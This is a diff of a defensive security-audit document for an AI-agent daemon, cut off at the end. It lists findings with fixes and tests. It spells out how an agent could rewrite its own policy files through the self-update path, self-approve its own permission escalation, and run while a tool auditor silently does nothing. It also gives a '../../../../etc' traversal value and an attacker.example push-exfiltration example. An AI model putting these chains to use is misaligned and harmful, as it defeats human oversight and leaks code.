@@ -379,7 +379,7 @@ test); a malicious-template `SecurityError` from `prompt_adapter.py`'s
 
 ## Round-3 additions (2026-07-10 deep-audit sweeps)
 
-### H-SELFMOD-DENYLIST (MED-HIGH, CONFIRMED) — policy docs missing from self-mod deny-lists
+### H-SELFMOD-DENYLIST (HIGH, CONFIRMED — exploit chain re-verified 2026-07-10 night-3) — policy docs missing from self-mod deny-lists
 
 **Defect:** `AGENTS.md`/`CLAUDE.md`/`TASKS.md` are in **neither** self-modification
 protected-path deny-list: `security/capability_lattice.py:41-75`
@@ -391,11 +391,28 @@ AGENTS.md is the repo's stated policy authority. `self_update/apply.py` hard-den
 pipelines like `planning/debt_applier.py:137-141` merge LLM-supplied paths into
 `plan.target_files`.
 
-**Fix:** add `AGENTS.md`/`CLAUDE.md`/`TASKS.md` (+ `.md` policy docs generally) to
-both deny-lists (stem + exact-name match).
+**Confirmed full exploit chain (2026-07-10 night-3 re-audit):** a self-improve
+proposal with `kind="config"`/`"yaml"` and `target_paths=["AGENTS.md"]` passes
+`applier.py`'s capability gate (:264-287), the workspace-confinement gate
+(:289-302, `_resolve_confined`), and `_first_protected` (:305-311) — no marker in
+`PROTECTED_PATH_MARKERS` (:41-64) matches `agents.md`/`claude.md`/`tasks.md` —
+then reaches the YAML branch (:324-351), where `yaml.safe_load(change_content)`
+(:326) succeeds on ordinary prose (Markdown text commonly parses as a valid YAML
+scalar/mapping) and the file is written via `self._writer.write(...)` (:351).
+This lets the CONFIG-tier self-update surface rewrite the very policy files that
+constrain the agent — a guardrail-integrity bypass, not merely a missing-marker
+gap.
+
+**Fix:** add `AGENTS.md`/`CLAUDE.md`/`TASKS.md` (+ `.md` policy docs generally,
+and any `.opencode`/`.claude` guardrail files not already covered) to all
+self-mod deny-lists (stem + exact-name match) — see H-DENYLIST-DRIFT below for
+why "all" currently means 3 independently-drifting lists rather than one.
 
 **Tests:** `is_protected_path("AGENTS.md")`/`("CLAUDE.md")` == `True`; an
-`apply_plan` targeting them is refused.
+`apply_plan` targeting them is refused; a `kind="config"` proposal with
+`target_paths=["AGENTS.md"]` and prose `change_content` that would otherwise
+parse as YAML is denied by the protected-path check before ever reaching the
+YAML branch (regression guard on the exact chain above).
 
 ### H-ENGINE-WRITE-GUARD (MED, CONFIRMED) — engine write path has no deny-list backstop
 
@@ -504,3 +521,827 @@ raise-if-`None`; write-side → add `project_id` to guarded WHERE.
 
 **Tests:** cross-tenant `get_by_id`/`set_status`/`remove` for a foreign project
 returns `None`/refuses; same-tenant works.
+
+## Round-4 additions (2026-07-10 night sweeps)
+
+### H-STREAM-TRAVERSAL (HIGH, CONFIRMED) — `/admin/stream/dispatch` RoleCloner path-traversal
+
+**Defect:** `routers/stream.py:36` declares `role: str` with only min/max length
+`Field` constraints, no character restriction; `:84` builds
+`role_dir = cloner.collection_root/"roles"/req.role` and checks only
+`.is_dir()`. `stream/__init__.py:62-69` `RoleCloner.clone` re-derives
+`src = collection_root/"roles"/role_name`, checks only `src.is_dir()`, then
+`shutil.copytree(src, clone_path)` with **no** realpath/`relative_to`/
+`commonpath` confinement anywhere in the chain. `role="../../../../etc"` copies
+an arbitrary directory into `/tmp/gludd-stream-clones/` and, if
+`wait_for_completion`, runs `ansible-playbook` in it and returns stdout
+(disclosure). PSK-gated, but any PSK holder can trigger it. This stands out —
+every other write path in the codebase (skills, diffs, model-writes, filestore,
+self-update) is realpath+containment-jailed; this one isn't.
+
+**Fix:** reject any `role` containing `/`, `\`, or `..`; additionally resolve
+`src.resolve()` and require `relative_to((collection_root/"roles").resolve())`
+before `copytree` (mirror `execution/engine.py::_resolve_in_workspace` /
+`self_update/applier.py::_resolve_confined`).
+
+**Tests:** `role="../.."` (and a literal path-separator role) rejected/404,
+`copytree` never called; a legitimate role still clones successfully.
+
+### H-MERGE-WRITER-SYMLINK (HIGH, PLAUSIBLE, def-in-depth)
+
+**Defect:** `pipeline/daemon_adapters.py:171-199` merge-writer joins `rel`
+(sourced from `git diff --name-only`) via `os.path.join` and opens it with a
+plain `open(path, "w")` — no realpath/containment check, unlike
+`self_update/applier.py::_resolve_confined`. Git itself blocks a literal `..`
+component in tracked paths, so the realistic trigger is a symlink already
+committed in the repo pointing outside the checkout, not a raw traversal
+string.
+
+**Fix:** realpath the resolved write target and require
+`relative_to(repo_path)` before opening for write, matching the confinement
+pattern used elsewhere for merge/apply writes.
+
+**Tests:** a tracked symlink pointing outside `repo_path` is refused as a merge
+target; a normal in-repo path still writes.
+
+### H-RELOAD-BATCH-TRAVERSAL (HIGH, PLAUSIBLE, low exploitability)
+
+**Defect:** `reload/hot_reloader.py:367-374` batch reload path builds
+`workspace_path = repo_root/norm` with no realpath/containment check, unlike
+the single-module reload path which does a sha256 check plus
+`_resolve_confined`. Combines with the H-RELOAD-BATCH-F1 finding already
+recorded above (Round-3) — the batch path is unwired in production today, but
+both gaps live in the same code and should be closed together.
+
+**Fix:** apply the same realpath + `_resolve_confined` containment check used
+by the single-module path to each `norm` entry in the batch path before any
+file operation.
+
+**Tests:** a batch entry containing `..` or resolving outside `repo_root` is
+refused; a legitimate batch of in-repo modules still reloads.
+
+### H-DISPATCH-SEMAPHORE + H-ANSIBLE-NOTIMEOUT (MED, CONFIRMED)
+
+**Defect:** the event-loop dispatch fan-out (`event_loop/loop.py:1558-1567`)
+has **no** `asyncio.Semaphore` bounding the concurrent `gather` — this matches
+the dispatch-semaphore proposed in `WAVE_C_DESIGNS_2026-07-10.md:426-452`
+(C-EVENTLOOP item 13), now **CONFIRMED absent** rather than merely proposed.
+Fan-out is bounded *upstream* though (`claim_runnable` limit=10 at
+`repository.py:424,451`, plus the floor cap at `controllers/floor.py:56`), so
+this is not "unbounded hundreds" in practice. The sharper finding: the ansible
+subprocess on the **main dispatch path** (`loop.py:2647-2652`,
+`await asyncio.to_thread(run_playbook)`) has **no** `asyncio.wait_for` timeout
+wrapper, unlike the review path (`loop.py:1037-1044`), which does. Combined
+with the ~10-wide upstream fan-out, that's up to ~10 concurrent
+unbounded-duration ansible subprocesses that can wedge dispatch capacity
+indefinitely. Separately, the DB connection pool is unsized
+(`db/session.py:94,124,138`) — LOW, since the deployment is SQLite-only today.
+
+**Fix:** add the dispatch semaphore from C-EVENTLOOP item 13 around the
+`loop.py:1558-1567` gather; wrap the main-path `run_playbook` call in
+`asyncio.wait_for(...)` mirroring the review path's timeout at
+`loop.py:1037-1044`. Size the DB pool as a follow-up once a non-SQLite backend
+is in play.
+
+**Tests:** dispatch gather never exceeds the semaphore bound under a burst of
+runnable tasks; a hung `run_playbook` on the main path times out and surfaces
+the same error shape as the review path's existing timeout (regression guard
+against silently reintroducing an unbounded wait).
+
+### H-TEARDOWN (MED, CONFIRMED) — daemon teardown gaps beyond ExecutionEngine drain
+
+**Status check:** not present earlier in this doc (Round-1 through Round-3) —
+adding fresh here, not a duplicate.
+
+**Defect:** beyond the already-covered C-ENGINE `ExecutionEngine` drain, daemon
+shutdown leaves several other resources undrained: (a) self-update audit tasks
+(`daemon.py:806`) are never awaited/cancelled-and-joined during teardown; (b)
+`DeploymentManager` has no `shutdown()` method at all
+(`infra/deployment.py:27,151`), so a non-idle GPU/inference stack is simply
+abandoned on daemon exit — a live cost leak, not just a resource-cleanliness
+issue — because teardown cancels the event-loop task at `daemon.py:2109`
+*before* the idle-reconcile logic ever gets a chance to run, and there's no
+`atexit`/signal-handler fallback to catch it; (c) `StallWatchdog.stop_sweeper`
+(`timing.py:302-308`, called from `daemon.py:2121-2124`) does a **blocking**
+`join(2s)` inline inside the async teardown path, stalling the event loop for
+up to 2s during shutdown.
+
+**Fix:** await/cancel-and-join the self-update audit tasks in teardown; add a
+`DeploymentManager.shutdown()` that reconciles/tears down non-idle deployments
+and call it *before* cancelling the reconcile task (or run one final
+reconcile pass synchronously during shutdown), plus register an `atexit`/
+signal fallback so a hard kill doesn't strand billable infra; replace the
+inline blocking `join(2s)` in `StallWatchdog.stop_sweeper` with
+`await asyncio.to_thread(...)` so teardown doesn't block the loop.
+
+**Tests:** daemon shutdown with a pending self-update audit task completes
+without leaking a task; a non-idle `DeploymentManager` deployment is torn down
+(or reconciled) during shutdown, not abandoned; `stop_sweeper` during teardown
+does not block the event loop (assert via a concurrently-scheduled no-op
+completing promptly).
+
+## Round-5 additions (2026-07-10 night-2)
+
+### H-WRITER-DRAIN-UNWIRED (HIGH, LATENT) — subprocess-writer queued DB writes are never applied
+
+**Status:** latent — no router in `src/` calls `enqueue_or_commit` today (only
+tests exercise it), so unreachable in prod traffic. But the entire
+`GLUDD_WRITER_MODE=subprocess` durable-write path is structurally disconnected,
+and it silently drops writes rather than erroring, so it will fail invisibly
+the moment a router adopts it.
+
+**Defect:** `WriteQueue` (`ipc/queue.py:61-192`, an in-memory `asyncio.Queue`-
+backed deque, `maxsize=1000`) is published to `app.state._write_queue` at
+`daemon.py:928`, and is meant to be drained by
+`EventLoop._drain_inbound_queue()` (`loop.py:775-821`) — but the production
+`EventLoop` construction (`daemon.py:1658-1741`) never passes
+`inbound_queue=`, so the drain loop never runs against it. The writer child's
+own `EventLoop` (`_child.py:164`) omits it too. The alternate spool-file path
+is equally dead: `_child.py:84-123` `_drain_spool` exists to read a JSONL
+spool, but `daemon.py:929` spawns `WriterProcess` with only `db_config` — no
+`inbound_spool_path` — so `_drain_spool` is unconditionally skipped. Net
+effect: an envelope enqueued via `writer/bridge.py:167` `enqueue_or_commit`
+gets an HTTP 202 immediately, then sits in the in-memory deque forever with no
+consumer — guaranteed loss on the next restart, and shutdown drain is
+lossy-by-design anyway (`daemon.py:2130-2133` `clear()`).
+
+**Fix (before any router adopts the queued path):** wire
+`inbound_queue=write_queue` into the production `EventLoop` construction at
+`daemon.py:1658-1741` (and the writer-child's at `_child.py:164`), or
+alternatively wire the `WriteQueue` → spool-file → child `_drain_spool` bridge
+end-to-end (pass `inbound_spool_path` at the `daemon.py:929` `WriterProcess`
+spawn) — pick one durable path, not both half-wired. Add a DB-landing ack so
+202 is only returned after the write actually applies (not merely enqueues).
+Add requeue/retry on a per-envelope apply failure — currently a failed apply
+inside the drain loop is dropped silently (`loop.py:803-821`), not retried.
+
+**Tests:** an envelope enqueued via `enqueue_or_commit` in
+`GLUDD_WRITER_MODE=subprocess` actually lands in the DB end-to-end (not just
+"was accepted with 202"); a crash mid-drain does not silently lose the
+envelope (requeued or persisted, not dropped); the prod `EventLoop`
+construction is asserted to pass a non-`None` `inbound_queue`
+(regression guard against the wiring being dropped again).
+
+### H-ADMIN-PSK-ONLY (HIGH) — entire /admin/* mutating surface has no capability/RBAC check, only the shared PSK
+
+**Defect:** every `/admin/*` endpoint is gated by nothing but the single
+shared `GLUDD_PSK` (`auth_and_stats_middleware`, `daemon.py:2468-2523`,
+constant-time `check_bearer_token`) — there is no `@Depends`/router split by
+privilege tier and zero `can_invoke`/`has_permission` calls in any router
+handler. Every dispatched agent holds this same PSK
+(`renderers/runner.py:227-229` injects `GLUDD_PSK` into the agent subprocess
+env), so any agent — or any caller who obtains a leaked PSK — can reach the
+entire privileged surface: compute deploy/destroy, spend reconfigure, STS
+issue/revoke, perm-spec `PUT` (`security.py:406`), escalation approve/deny,
+integrity approve, filestore write/remove, process signal, account delete,
+webhook registration, model add/remove. Worst instance: the human-review
+endpoints (`*/approve`, `PATCH /api/human-todos/{id}` →
+`_sync_escalation_from_human_todo`, `security.py:183-218`) only check that a
+free-text `human_reviewer`/`human_resolver` field is non-empty — they never
+verify the caller's identity — so an agent holding the PSK can write its own
+name into that field and self-approve its own permission escalation.
+
+**Fix:** add a capability gate per privileged endpoint, reusing the existing
+capability lattice / agent-permission matrix (ties to C-SEC-1's dead-registry
+finding — that matrix needs to actually be consulted here too). The
+human-review endpoints need a genuinely distinct human-identity second
+factor — not a free-text field an agent can populate — i.e. a separate
+operator credential/role distinct from the agent-held PSK, checked
+server-side rather than trusted from the request body.
+
+**Tests:** a request carrying an agent-tier PSK is refused on a privileged
+`/admin` op reserved for operator tier; a self-approval attempt on an
+escalation record (reviewer/resolver identity equal to the requesting
+agent's own identity) is refused rather than accepted on the strength of a
+free-text field.
+
+### H-BINARY-BUNDLING-GAPS (MED) — redistributable can't run required tools with an empty PATH
+
+**Defect:** three independent gaps in the bundled-binary story
+(cross-ref `BINARY_BUNDLING.md`): (a) `rg` bundling is non-functional — the
+Makefile's `bundle-ripgrep` target has a placeholder `RG_SHA256` of all
+zeros, so `shasum -c` always fails and `dist/binaries/rg` is never populated
+(`Makefile:2266-2282`), silently degrading to bare PATH lookup instead of
+failing the build; (b) `tofu` and `osquery` have working
+`BinaryBootstrapper` machinery — pinned `KNOWN_VERSIONS`
+(`OPENTOFU_VERSION=1.9.0`/`OSQUERY_VERSION=5.10.2`), fail-closed digest
+verification, `download_bundled_binaries.py` populating `dist/binaries` — but
+the actual runtime call sites never consult it: `infra/deployment.py:184`
+`get_infra_binary()` is a PATH-only `shutil.which`, never calling
+`get_bundled_binary_path`, and `connectors/osquery.py:95` defaults to the
+bare name `"osqueryi"`; (c) `BinaryPathResolver.get_secrets_binary()`
+(vault/bao CLI) and the `BinaryPaths.git`/`ansible_playbook` fields are dead
+code — defined, zero callers — those binaries are invoked elsewhere by bare
+literal argv strings instead.
+
+**Fix:** set a real per-platform `RG_SHA256` in the Makefile (or make
+`bundle-ripgrep` fail the build loudly on a placeholder/mismatched hash,
+never silently skip); route `infra/deployment.py:184` and
+`connectors/osquery.py:95` through `get_bundled_binary_path` first
+(bundle-first resolution, falling back to PATH only if bundling is
+genuinely absent); either wire `BinaryPathResolver.get_secrets_binary()` and
+the dead `BinaryPaths` fields into their real call sites, or remove them so
+the dead code doesn't imply a guarantee that isn't kept.
+
+**Tests:** a build with `PATH` emptied still successfully runs `rg`, `tofu`,
+and `osqueryi` by resolving to `dist/binaries`; running `bundle-ripgrep` with
+the placeholder/all-zero sha fails the build instead of silently producing
+an empty `dist/binaries/rg`.
+
+## Round-6 additions (2026-07-10 night-2)
+
+### H-GIT-PUSH-REMOTE (MEDIUM, CONFIRMED) — push helpers validate `remote` for shell-injection only, not SSRF/URL
+
+**Defect:** `git_automation/repo.py` push helpers — `push` (:279-284) and
+`push_to_remote` (:785-790) — validate the `remote` positional only via
+`_reject_leading_dash` plus a `--` end-of-options guard; there is **no
+allowlist** and **no SSRF/URL vetting**. `git push <remote>` accepts a full
+URL, and `_reject_leading_dash` happily permits `https://...` (it only rejects
+a leading `-`). The SSRF machinery that already exists in this same file —
+`reject_unsafe_repo_url`/`_host_is_blocked` → `resolved_host_is_blocked`
+(repo.py:64-126) — is wired into **clone only**, not push: an asymmetry
+between the two directions of repo network I/O. Reachable end-to-end: the
+ansible module `collections/ansible_collections/general_ludd/agent/plugins/
+modules/gludd_git.py:274-278` (`op == "push"`) reads
+`remote=module.params["remote"]` with no intermediate validation and forwards
+it verbatim into `push_to_remote(...)` (the exact assignment is on line 276) —
+so an agent-authored playbook setting `remote: https://attacker.example/x.git`
+pushes the local repo's commits to an arbitrary attacker-controlled remote,
+i.e. repo/code **exfiltration**. (`self_improve/harness.py:384`
+`git.commit_and_push(message)` uses the hardcoded default `remote="origin"`
+and is not itself exposed to untrusted input — confirmed no `remote=` kwarg is
+threaded through from self-improve.)
+
+**Fix:** allowlist `remote` to a configured named remote (e.g. only accept
+values present in `git remote` for the repo, or a project-config allowlist),
+OR — for the URL-form case — route it through the existing
+`reject_unsafe_repo_url` the same way `clone` already does, so a URL remote
+gets the identical scheme/`::`/SSRF vetting as a clone source.
+
+**Test:** `op=push` (and direct `GitAutomation.push`/`push_to_remote` calls)
+with a URL-shaped or non-allowlisted `remote` is rejected; a legitimate named
+remote (e.g. `origin`) still pushes successfully; regression test asserting
+`push`/`push_to_remote` call the same vetting path `reject_unsafe_repo_url`
+already exercises for clone.
+
+**ALSO note (LOW, latent, fix alongside for symmetry — no untrusted caller
+today):** `tag_release`/`tag_checkpoint` (repo.py:271-277) lack
+`_reject_leading_dash` + a `--` guard on the `tag` argument; `remove_worktree`
+(repo.py:526-527) lacks an `_reject_escaping_path`-style check on
+`worktree_path` (confined in practice because callers only pass
+git-registered worktree paths, so not currently exploitable, but the other
+path-taking methods in this file all have an explicit confinement check and
+this one doesn't). Add both for consistency with the rest of the file's
+defense-in-depth posture; no test urgency since there's no untrusted caller,
+but a regression test (leading-dash tag rejected; escaping worktree path
+rejected) should land with the fix.
+
+### H-MIGRATIONS-DECORATIVE (HIGH, CONFIRMED) — production alembic migrations never run their `upgrade()` body
+
+**Defect:** in production, alembic migrations NEVER execute. Daemon startup
+(`daemon.py:913-914`) calls `await ensure_tables(engine)`, which is
+`Base.metadata.create_all` under the hood (`db/session.py:158-162`:
+`ensure_tables` does `conn.run_sync(Base.metadata.create_all)` when the URL is
+SQLite). Immediately after, `daemon.py:986-995` calls `stamp_head`
+(`db/migrations.py:24-25`: `command.stamp(cfg, "head")`) — `stamp` **only
+writes the alembic `alembic_version` revision id**, it never executes a
+migration's `upgrade()` body. A repo-wide check confirms `command.upgrade(`
+is called **only from 3 test files**, never from anything under `src/`.
+Compounding this: `create_all(checkfirst=True)` (SQLAlchemy's default) only
+creates tables that are **missing** — it does not `ALTER` an existing table to
+add a column/index/constraint. Because the daemon stamps straight to `head`
+right after `create_all`, any subsequent manual `alembic upgrade head` run by
+an operator is a silent no-op (the revision is already stamped at head).
+
+Net effect: any migration whose real work is an **alter** to an
+already-existing table (add column/index/CHECK constraint to a table that a
+prior code version already created via `create_all`) **never applies** to a
+production SQLite DB that was first created under an older code version.
+Concrete confirmed instances of this shape in the migration set: the
+blob-length CHECK-constraint recreate (see `tests/unit/
+test_db_models_blob_length.py`) and the `BucketLease.expires_at` index
+addition — both are alter-an-existing-table migrations with no live path into
+a DB that predates them. New-table migrations are masked/hidden by this bug
+because `create_all` independently creates any missing table anyway, so only
+the alter-class migrations are silently dead. This is not caught by
+`test_alembic_orm_parity`/`create_all_parity`-style tests because both build
+their "migrated" schema from a **fresh** `upgrade` run starting at base — they
+never exercise the actual production sequence of
+`create_all` (old schema) → `stamp_head` → later code adds an alter migration
+→ real deploy never runs `upgrade`.
+
+**Fix:** add `upgrade_head(cfg: AlembicConfig) -> None: command.upgrade(cfg,
+"head")` to `db/migrations.py` alongside `stamp_head`. In `daemon.py`, replace
+the `ensure_tables` + `stamp_head` pair with `upgrade_head` unconditionally —
+it is idempotent on an up-to-date DB (no-op) and correctly runs base→head on
+an empty/fresh DB (so `create_all` is no longer needed on the daemon startup
+path for schema creation). Keep `create_all` only as a try/except fallback for
+non-daemon callers (tests, scripts) that want a quick throwaway schema without
+running through alembic.
+
+**Correction (2026-07-10 night-3 re-audit) — the fix above is UNSAFE as a bare
+swap; re-verified against the current code:**
+
+1. **Ordering — must run BEFORE `seed_initial_queues`, not where `stamp_head`
+   currently sits.** `daemon.py` today runs schema creation (`ensure_tables`,
+   :913-914) **before** `seed_initial_queues` (:922 in subprocess-writer mode /
+   :940 in inline mode), and only runs `stamp_head` **after** seeding has
+   already completed (:986-995) — seeding requires the tables to exist first.
+   A one-line swap of `stamp_head` → `upgrade_head` at its *current* call site
+   (after seeding) is not equivalent to the intended fix: `upgrade_head` must
+   instead run where `ensure_tables` runs today (before `seed_initial_queues`),
+   since on a legacy DB an alter-class migration may need to run before rows
+   can safely be seeded. This is a bigger change than swapping one function
+   name — it requires moving the migration call earlier in daemon startup.
+2. **Data loss — migration 022 unconditionally drops `memory_records`.**
+   `022_recreate_memory_records_g1.py:27` (`op.drop_table("memory_records")`)
+   destroys the table's contents before recreating it under the G1 schema.
+   Its docstring justifies this as safe "because SQLite has no data in this
+   unused table" — true only as long as `memory_records` has never actually
+   been written in a production deployment. Because migrations are decorative
+   today (this very defect), that assumption has never been exercised for
+   real. The moment `upgrade_head` actually runs on a live daemon instead of
+   being perpetually skipped, any row that has accumulated in
+   `memory_records` (e.g. via `MemoryRepository.set`, `db/repository.py:
+   2776-2841`) is destroyed with no backup and no way back — a genuine
+   data-loss risk introduced by turning on the very fix proposed above.
+3. **Required guard, not a straight enable.** Before wiring `upgrade_head`
+   into daemon startup, migration 022 needs a pre-upgrade branch that either
+   (a) rewrites `022.upgrade()` to copy existing `memory_records` rows forward
+   into the new `(agent_id, key, value, namespace, ttl_seconds)` shape instead
+   of an unconditional drop, or (b) adds a pre-flight check that aborts with
+   an operator-visible alert if the table is non-empty rather than silently
+   dropping it. Ship the guard together with the ordering fix in (1) — do not
+   land "just enable `upgrade_head`" as a standalone change.
+
+This doesn't change the underlying diagnosis (migrations are decorative in
+production today) — it changes the fix from "swap `stamp_head` for
+`upgrade_head`" to "swap it, run it earlier than `stamp_head`'s current call
+site, and land a 022-specific data-safety guard first."
+
+**Test:** assert daemon startup calls `upgrade_head`, not merely `stamp_head`
+(a wiring-regression guard); a regression test that builds a DB from an OLDER
+schema snapshot (pre-alter-migration), then calls `upgrade_head`, and asserts
+the alter (e.g. the blob-length CHECK or the `BucketLease.expires_at` index)
+actually lands — the exact production scenario the existing parity tests
+cannot catch because they always start from a fresh `upgrade` at base.
+
+## Round-7 additions (2026-07-10 night-2)
+
+### H-OBS-TENANT-LEAK (HIGH, CONFIRMED) — observability/reporting endpoints leak cross-tenant data because the PSK carries no tenant identity
+
+**Defect:** the daemon's single global `GLUDD_PSK` middleware
+(`daemon.py:2468-2504`) authenticates a request but carries **no tenant
+identity** — `AuthPosture` has no `project_id` field (`security/auth.py:32-49`).
+Consequently every `project_id` query param across the observability/reporting
+surface is a **client-supplied courtesy filter**, not an enforced authorization
+boundary: any PSK holder can omit or forge it to read across all tenants.
+Confirmed leaks:
+- `/api/spend`, `/api/costs`, `/admin/costs`, `/api/credits`
+  (`routers/spend.py:51,144,107,198`) — **no** `project_id` param at all; global
+  and by-project cost breakdowns are visible to any PSK holder.
+- `/admin/benchmark/recent` (`routers/benchmark.py:30-55` →
+  `repository.py:1042-1051` `list_recent`, no `WHERE project_id`) and
+  `/admin/benchmark/scores` (`benchmark.py:18-28` — the repo method supports
+  `project_id` but the endpoint never passes it) — cross-tenant benchmark rows.
+- `/api/traces`, `/api/facts`, `/api/metrics`
+  (`facts.py:461-476/393-447/449-459`) — `project_id` is **optional**; omitting
+  it returns all-tenant data (scoped-if-requested, not enforced).
+- `/api/accounting` (`accounting.py:240-248`) — `account_all()` is global by
+  design and leaks per-project cost to any PSK holder.
+- `/api/status` (`todos.py:497-567`) — a **public** path (no PSK at all),
+  unauthenticated info-disclosure of version/hardware-profile/queue-depths/
+  binary-versions.
+
+**Positive (no fix needed):** the one HTML render path `/render/{name}` is
+well-defended — `SandboxedEnvironment` + `autoescape=select_autoescape(default=True)`
+(`render.py:75-80`); `/admin/ansible/render` uses `render_sandboxed`
+(`StrictUndefined`, empty globals, unsafe-wrapped vars). But the JSON endpoints
+return free-text agent/user content (todo description, `task_description`,
+`match_text`) **unescaped**, and no `html.escape`/`markupsafe`/`bleach` exists
+anywhere in `src/` — any first-party dashboard rendering these into the DOM
+inherits stored-XSS (the backend provides no defense-in-depth for that case).
+
+**Root cause** (shared with H-ADMIN-PSK-ONLY + H-DB-TENANT-SCOPING above): the
+PSK is not tenant-bound.
+
+**Fix:** (1) real multi-tenancy requires binding project scope to the
+**credential** (per-project tokens / `project_id` in `AuthPosture`), not
+client-supplied params — the architectural fix, ties to C-SEC-1. (2) Interim:
+add and **enforce** `project_id` scoping on `/api/spend|costs|credits` and
+`/admin/benchmark/recent|scores` (require the caller's project scope, reject
+cross-project reads). (3) Gate or trim `/api/status` (currently unauthenticated).
+(4) Document the "JSON output is unescaped — clients MUST escape" contract, or
+add output-encoding for any first-party dashboard.
+
+**Tests:** a project-A-scoped credential cannot read project-B spend/benchmark
+data; `/api/status` doesn't leak sensitive host detail unauthenticated.
+
+## Round-8 additions (2026-07-10 night-2)
+
+### H-STARTUP-NULL-DEPS (MEDIUM, CONFIRMED) — two construction-order bugs silence the GPU-cost-teardown
+
+**Defect:** two independent instances of the same construction-order bug class
+silently disable the idle-GPU cost-tracking phase. (a) `daemon.py:1736` passes
+`infra_tracker=getattr(app.state, "_infra_tracker", None)` into `EventLoop(...)`
+(constructed at 1658-1741), but `app.state._infra_tracker` is only created at
+`daemon.py:1832-1833` — **after** the `EventLoop` already exists.
+`EventLoop.__init__` stores it as a plain snapshot (`loop.py:343`) and never
+re-reads `app.state`, so it's permanently `None`. Consumed at
+`loop.py:3595-3609` (idle-GPU cost recording) = dead code. (b)
+`daemon.py:1733` reads `app.state._deployment_manager` before it's set — it's
+lazily created in `routers/compute.py:61-79` on first `/admin/compute/deploy`,
+which can't fire before startup completes — so the snapshot is `None` at
+`loop.py:330`, and the idle-GPU auto-teardown `self._deployment_manager.destroy(...)`
+at `loop.py:3612` is likewise dead code. Net effect: the idle-GPU
+cost-tracking + auto-teardown phase never runs at all — combined with
+H-TEARDOWN (Round-4: no shutdown teardown either), a deployed GPU/inference
+stack is torn down **neither** at idle **nor** at shutdown, a confirmed cost
+leak from both angles. This file's own CA-T7/CA-T8/CA-T9/H3 comments document
+3 prior fixes of this exact bug class (`health_tracker`/`quantization_tracker`/
+`spend_limiter` pre-built before `EventLoop()`); `infra_tracker` +
+`deployment_manager` are two more unfixed instances of the same pattern.
+
+**Fix:** pre-build `infra_tracker` + `deployment_manager` **before** the
+`EventLoop()` construction (mirror the CA-T7/8/9 fix pattern), OR have
+`EventLoop` lazily fetch them from `app.state` at phase-execution time instead
+of snapshotting at construction.
+
+**Tests:** after startup, `EventLoop._infra_tracker` and
+`EventLoop._deployment_manager` are the live `app.state` instances, not
+`None`; the idle-teardown phase actually invokes `destroy` on an idle
+deployment (regression guard against the same construction-order class
+recurring a 3rd/4th time).
+
+### H-RELOAD-CONCURRENT (MEDIUM, ties to C-RELOAD) — concurrent `/admin/reload` calls race on shared registries with no lock
+
+**Defect:** `POST /admin/reload` (`routers/reload.py:74-103`) builds a
+brand-new `HotReloader` on every call (no caching/guard) and runs `.reload(scope)`
+via `asyncio.to_thread` — a real OS thread. `HotReloader.__init__`
+(`reload/hot_reloader.py:63-90`) and its only other construction site
+(`reload/self_improve.py:26`) hold no lock. Two concurrent `/admin/reload`
+calls get **separate** `HotReloader` instances, but both threads mutate the
+**same** shared `skill_registry`/`prompt_registry`/`worker_broadcaster` with
+zero synchronization — a genuine data race. Admin/PSK-gated, so it needs
+concurrent operator/automation reloads to trigger, but this is the concrete
+reachable instance of the `C-RELOAD` module-level-lock design (see
+`docs/design/WAVE_C_ADDENDUM_2026-07-10.md` C-RELOAD correction) —
+cross-reference it.
+
+**Fix:** the module-level lock table keyed by resolved path (per the
+C-RELOAD corrected design) serializes concurrent reloads regardless of
+per-instance `HotReloader`, closing the race without requiring a singleton
+`HotReloader`.
+
+**Tests:** two concurrent `/admin/reload` calls serialize (second waits for
+the first to release the path's lock); no torn registry state observed
+across the concurrent pair (assert `skill_registry`/`prompt_registry` end in
+a fully-applied-or-fully-pending state, never a partial mix from both
+threads).
+
+### H-READYZ-PREMATURE (LOW, def-in-depth) — `/readyz` treats "task not yet set" the same as "task healthy"
+
+**Defect:** `/readyz` (`daemon.py:2590-2622`) reads `_event_loop_task` via
+`getattr(...)` defaulting to `None`, and treats "not yet set" identically to
+"task healthy" — it never **positively** requires the task to exist before
+returning ready. A request arriving before `daemon.py:1757` (where the task
+is actually assigned) gets a `200`/ready response. Not exploitable under
+standard ASGI — lifespan reaches `yield` at `daemon.py:2048` before HTTP is
+served at all, so ordering already prevents this in the common case — but
+it's a defense-in-depth gap for multi-worker deployments, non-standard hosts,
+or in-process tests that call the handler directly without going through
+full ASGI lifespan sequencing.
+
+**Fix:** `/readyz` returns not-ready (`503`) when `_event_loop_task` is
+`None`, rather than folding the missing-task case into the same branch as a
+healthy task.
+
+**Tests:** calling the `/readyz` handler with `app.state._event_loop_task`
+unset (or explicitly `None`) returns not-ready/`503`; with a live task
+assigned, returns ready/`200` (regression guard on the existing happy path).
+
+## Round-9 additions (2026-07-10 night-2)
+
+### H-LANGGRAPH-AUDITOR-NOOP (MED-HIGH, CONFIRMED) — LangGraph tool-loop's `tool_auditor` is stored but never invoked
+
+**Defect:** `execution/langgraph_agent.py` `LangGraphAgentLoop.__init__` accepts
+and stores `tool_auditor` (:55,62) but **never invokes it** — no `.audit()`/
+`.record_success()`/`.record_error()`/`.reset()` call exists anywhere in the
+file (grep confirms only the constructor assignment). Contrast
+`ToolCallLoop`, which calls the auditor before/after every tool call and on
+error (`tool_loop.py:256-257,289-290,297-298,315-316,337-338`). Since
+`event_loop/loop.py:2363,2369` constructs a **real** `ToolCallAuditor()` and
+passes it into `LangGraphAgentLoop`, this is a false sense of coverage —
+adversarial/anomalous tool-call detection silently no-ops whenever
+`use_langgraph_tool_loop=True` (config-gated, default `False`). Compounding
+gap: `LangGraphAgentLoop` also has **no** `budget_guard`, **no**
+`adversarial_detector`, **no** cumulative `max_total_tokens` cap, and **no**
+`work_type_max_iterations` — all present on `ToolCallLoop`
+(`tool_loop.py:58-62,98-102,174-186,215-220`); the only bound on the
+LangGraph path is `recursion_limit` plus a per-tool `asyncio.wait_for` — a
+DoS/cost-control regression specific to the LangGraph path.
+
+**Fix:** wire the auditor calls (pre/post/on-error, mirroring `tool_loop.py`'s
+call sites) plus `budget_guard` and a cumulative token cap into
+`LangGraphAgentLoop`'s tool-dispatch node, bringing it to parity with
+`ToolCallLoop`.
+
+**Tests:** an anomalous/over-budget tool-call sequence is caught on the
+LangGraph path too (currently only caught on the `ToolCallLoop` path).
+
+### H-HUMANGATE-NO-CHECKPOINTER (MED-HIGH, PLAUSIBLE-high-confidence) — gate graph compiled without a checkpointer breaks interrupt/resume
+
+**Defect:** `execution/human_gate.py:62-73` `_build_gate_graph()` does
